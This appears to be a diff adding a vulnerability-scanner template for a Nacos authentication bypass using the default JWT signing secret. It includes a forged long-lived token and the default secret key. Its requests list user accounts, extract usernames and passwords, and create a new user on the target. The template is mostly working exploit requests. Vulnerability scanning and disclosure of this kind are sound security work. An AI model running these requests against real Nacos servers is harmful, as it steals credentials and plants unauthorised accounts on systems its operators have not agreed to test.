@@ -1,0 +1,82 @@
+id: nacos-bypass-authentication
+
+variables:
+  token: eyJhbGciOiJIUzI1NiJ9.eyJzdWIiOiJuYWNvcyIsImV4cCI6OTk5OTk5OTk5OTl9.vqhkMLKmquQ6R5AD6VWrTOqgClC599nnAQgQLHhPcLc
+  # token is signed with a very long time expire.
+
+info:
+  name: Nacos Bypass Auth with default jwt secret
+  author: Esonhugh
+  severity: critical
+  classification:
+    cwe-id: cwe-281
+  description: |
+    Nasos bypass authentication with default jwt secret:
+    'SecretKey012345678901234567890123456789012345678901234567890123456789'
+  reference:
+    - https://github.com/alibaba/nacos/issues/10060
+    - https://avd.aliyun.com/detail?id=AVD-2023-1655789
+    - https://nacos.io/zh-cn/docs/auth.html
+  tags: auth-bypass, nacos
+
+# stop-at-first-match: true
+requests:
+  - method: GET
+    path:
+      # - "{{BaseURL}}/nacos/v1/auth/users?pageNo=1&pageSize=10&accessToken=eyJhbGciOiJIUzI1NiJ9.eyJzdWIiOiJuYWNvcyIsImV4cCI6OTk5OTk5OTk5OTl9.vqhkMLKmquQ6R5AD6VWrTOqgClC599nnAQgQLHhPcLc"
+      - "{{BaseURL}}/nacos/v1/auth/users?pageNo=1&pageSize=10&accessToken={{token}}"
+      # - "{{BaseURL}}/v1/auth/users?pageNo=1&pageSize=10&accessToken=eyJhbGciOiJIUzI1NiJ9.eyJzdWIiOiJuYWNvcyIsImV4cCI6OTk5OTk5OTk5OTl9.vqhkMLKmquQ6R5AD6VWrTOqgClC599nnAQgQLHhPcLc"
+      - "{{BaseURL}}/v1/auth/users?pageNo=1&pageSize=10&accessToken={{token}}"
+    matchers-condition: and
+    matchers:
+      - type: status
+        status:
+          - 200
+
+      - type: word
+        words:
+          - '"username":'
+          - '"password":'
+        condition: and
+      - type: word
+        part: header
+        words:
+          - "application/json"
+
+    extractors:
+      - type: json
+        part: body
+        json:
+          - "{ name: .pageItems.[].username , pass: .pageItems.[].password }"
+        name: extract default username and password
+
+  - method: POST
+    path:
+      - "{{BaseURL}}/nacos/v1/auth/users"
+      - "{{BaseURL}}/v1/auth/users"
+    headers:
+      Content-Type: application/x-www-form-urlencoded
+      accessToken: "{{token}}"
+    body: "username=testuser{{randstr_1}}&password={{randstr_2}}"
+    matchers-condition: and
+    matchers:
+      - type: status
+        status:
+          - 200
+      - type: word
+        words:
+          - '"code":'
+          - "200"
+          - '"data":'
+          - '"create user ok!"'
+        condition: and
+      - type: word
+        part: header
+        words:
+          - "application/json"
+    extractors:
+      - type: json
+        part: body
+        json:
+          - ".message"
+        name: Create user testuser{{randstr_1}}/{{randstr_2}}
